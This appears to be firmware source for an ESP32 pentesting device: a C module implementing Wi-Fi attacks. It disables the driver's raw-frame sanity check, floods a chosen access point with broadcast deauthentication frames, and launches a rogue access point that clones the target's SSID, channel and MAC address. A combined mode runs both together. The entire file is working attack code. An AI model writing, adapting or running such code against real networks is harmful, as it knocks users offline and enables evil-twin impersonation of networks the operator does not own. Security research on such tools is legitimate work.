// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_wifi_attacks.h"

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_err.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "poom_wifi_ctrl.h"

static const char *POOM_WIFI_ATTACKS_TAG = "poom_wifi_attacks";

#if CONFIG_POOM_WIFI_ATTACKS_ENABLE_LOG

    #define POOM_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_D(fmt, ...) \
        printf("[D] [%s] %s:%d: " fmt "\n", POOM_WIFI_ATTACKS_TAG, __func__, __LINE__, ##__VA_ARGS__)

#else

    #define POOM_PRINTF_E(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)
    #define POOM_PRINTF_W(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)
    #define POOM_PRINTF_I(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)
    #define POOM_PRINTF_D(...) do { (void)POOM_WIFI_ATTACKS_TAG; } while (0)

#endif

static TaskHandle_t s_poom_wifi_attacks_task_broadcast = NULL;
static TaskHandle_t s_poom_wifi_attacks_task_rogue_ap = NULL;

static bool s_poom_wifi_attacks_broadcast_running = false;
static bool s_poom_wifi_attacks_rogue_ap_running = false;

static const uint8_t s_poom_wifi_attacks_deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Overrides the original raw frame sanity check used by Wi-Fi internals.
 * @param[in,out] arg1 First opaque argument.
 * @param[in,out] arg2 Second opaque argument.
 * @param[in,out] arg3 Third opaque argument.
 * @return int
 */
int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3)
{
    (void)arg1;
    (void)arg2;
    (void)arg3;
    return 0;
}

/**
 * @brief Sends one raw IEEE802.11 frame through AP interface.
 * @param[in] frame Raw frame buffer.
 * @param[in] frame_len Raw frame size in bytes.
 * @return void
 */
static void poom_wifi_attacks_send_raw_frame_(const uint8_t *frame, size_t frame_len)
{
    esp_err_t error = esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(error));
        s_poom_wifi_attacks_broadcast_running = false;
    }
}

/**
 * @brief Runs the broadcast deauthentication attack task loop.
 * @param[in,out] param Target AP record pointer.
 * @return void
 */
static void poom_wifi_attacks_broadcast_attack_task_(void *param)
{
    esp_err_t error;
    wifi_ap_record_t ap = *(wifi_ap_record_t *)param;
    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];

    error = poom_wifi_ctrl_deinit();
    if((error != ESP_OK) && (error != ESP_ERR_WIFI_NOT_INIT))
    {
        POOM_PRINTF_W("poom_wifi_ctrl_deinit warning: %s", esp_err_to_name(error));
    }

    error = poom_wifi_ctrl_manager_ap_start(NULL);
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_manager_ap_start failed: %s", esp_err_to_name(error));
        s_poom_wifi_attacks_broadcast_running = false;
        s_poom_wifi_attacks_task_broadcast = NULL;
        vTaskDelete(NULL);
        return;
    }

    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(s_poom_wifi_attacks_deauth_frame_default));
    memcpy(&frame[10], ap.bssid, 6);
    memcpy(&frame[16], ap.bssid, 6);

    POOM_PRINTF_I("Starting broadcast attack");
    POOM_PRINTF_I("SSID: %s | CH: %d | RSSI: %d", ap.ssid, ap.primary, ap.rssi);
    POOM_PRINTF_D("BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                  ap.bssid[0],
                  ap.bssid[1],
                  ap.bssid[2],
                  ap.bssid[3],
                  ap.bssid[4],
                  ap.bssid[5]);

    (void)esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);
    (void)esp_wifi_set_promiscuous(true);

    while(s_poom_wifi_attacks_broadcast_running)
    {
        POOM_PRINTF_D("Sending deauth frame");
        poom_wifi_attacks_send_raw_frame_(frame, sizeof(frame));
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    POOM_PRINTF_I("Broadcast attack stopped");
    s_poom_wifi_attacks_task_broadcast = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Sends one broadcast deauthentication frame for a target AP.
 * @param[in,out] ap Target AP record.
 * @return void
 */
void poom_wifi_attacks_broadcast_once(wifi_ap_record_t *ap)
{
    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];

    if(ap == NULL)
    {
        return;
    }

    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(s_poom_wifi_attacks_deauth_frame_default));
    memcpy(&frame[10], ap->bssid, 6);
    memcpy(&frame[16], ap->bssid, 6);

    POOM_PRINTF_I("Broadcast deauth: %s", ap->ssid);
    poom_wifi_attacks_send_raw_frame_(frame, sizeof(frame));
}

/**
 * @brief Runs rogue AP attack task loop.
 * @param[in,out] param Target AP record pointer.
 * @return void
 */
static void poom_wifi_attacks_rogue_ap_attack_task_(void *param)
{
    wifi_ap_record_t ap = *(wifi_ap_record_t *)param;
    esp_err_t error;
    wifi_config_t rogue_config = {
        .ap = {
            .ssid_len = strlen((char *)ap.ssid),
            .channel = ap.primary,
            .authmode = ap.authmode,
            .max_connection = 1
        }
    };

    memcpy(rogue_config.ap.ssid, ap.ssid, 32);
    strcpy((char *)rogue_config.ap.password, "dummypassword");

    POOM_PRINTF_I("Starting rogue AP: SSID=%s, channel=%d", ap.ssid, ap.primary);

    error = poom_wifi_ctrl_init_apsta();
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
        s_poom_wifi_attacks_task_rogue_ap = NULL;
        vTaskDelete(NULL);
        return;
    }

    error = poom_wifi_ctrl_set_ap_mac(ap.bssid);
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_set_ap_mac failed: %s", esp_err_to_name(error));
        s_poom_wifi_attacks_task_rogue_ap = NULL;
        vTaskDelete(NULL);
        return;
    }

    error = poom_wifi_ctrl_ap_start(&rogue_config);
    if(error != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_ap_start failed: %s", esp_err_to_name(error));
        (void)poom_wifi_ctrl_restore_ap_mac();
        s_poom_wifi_attacks_task_rogue_ap = NULL;
        vTaskDelete(NULL);
        return;
    }

    s_poom_wifi_attacks_rogue_ap_running = true;
    while(s_poom_wifi_attacks_rogue_ap_running)
    {
        vTaskDelay(pdMS_TO_TICKS(10000));
    }

    POOM_PRINTF_I("Rogue AP attack stopped");
    (void)poom_wifi_ctrl_restore_ap_mac();
    s_poom_wifi_attacks_task_rogue_ap = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Stops all running attacks.
 * @param[in,out] none Not used.
 * @return void
 */
void poom_wifi_attacks_stop(void)
{
    POOM_PRINTF_I("Stopping all attacks");
    s_poom_wifi_attacks_broadcast_running = false;
    s_poom_wifi_attacks_rogue_ap_running = false;
}

/**
 * @brief Starts the selected attack against the target AP.
 * @param[in] attack_type Selected attack mode.
 * @param[in,out] ap_target Target AP record.
 * @return void
 */
void poom_wifi_attacks_handle(
    poom_wifi_attacks_type_t attack_type,
    wifi_ap_record_t *ap_target)
{
    wifi_ap_record_t *target_copy;

    if(ap_target == NULL)
    {
        POOM_PRINTF_E("Target AP is NULL");
        return;
    }

    POOM_PRINTF_I("Starting attack type=%d on SSID=%s", (int)attack_type, ap_target->ssid);

    target_copy = malloc(sizeof(wifi_ap_record_t));
    if(target_copy == NULL)
    {
        POOM_PRINTF_E("Out of memory");
        return;
    }
    memcpy(target_copy, ap_target, sizeof(wifi_ap_record_t));

    switch(attack_type)
    {
        case poom_wifi_attacks_type_broadcast:
            s_poom_wifi_attacks_broadcast_running = true;
            (void)xTaskCreate(
                poom_wifi_attacks_broadcast_attack_task_,
                "deauth_task",
                4096,
                target_copy,
                5,
                &s_poom_wifi_attacks_task_broadcast);
            break;

        case poom_wifi_attacks_type_rogue_ap:
            s_poom_wifi_attacks_rogue_ap_running = true;
            (void)xTaskCreate(
                poom_wifi_attacks_rogue_ap_attack_task_,
                "rogueap_task",
                4096,
                target_copy,
                5,
                &s_poom_wifi_attacks_task_rogue_ap);
            break;

        case poom_wifi_attacks_type_combine:
            s_poom_wifi_attacks_broadcast_running = true;
            s_poom_wifi_attacks_rogue_ap_running = true;
            (void)xTaskCreate(
                poom_wifi_attacks_broadcast_attack_task_,
                "deauth_task",
                4096,
                target_copy,
                5,
                &s_poom_wifi_attacks_task_broadcast);
            (void)xTaskCreate(
                poom_wifi_attacks_rogue_ap_attack_task_,
                "rogueap_task",
                4096,
                target_copy,
                5,
                &s_poom_wifi_attacks_task_rogue_ap);
            break;

        default:
            POOM_PRINTF_W("Unknown attack type");
            free(target_copy);
            break;
    }
}

/**
 * @brief Returns the number of supported attack types.
 * @param[in,out] none Not used.
 * @return int
 */
int poom_wifi_attacks_get_attack_count(void)
{
    return (int)poom_wifi_attacks_type_count;
}
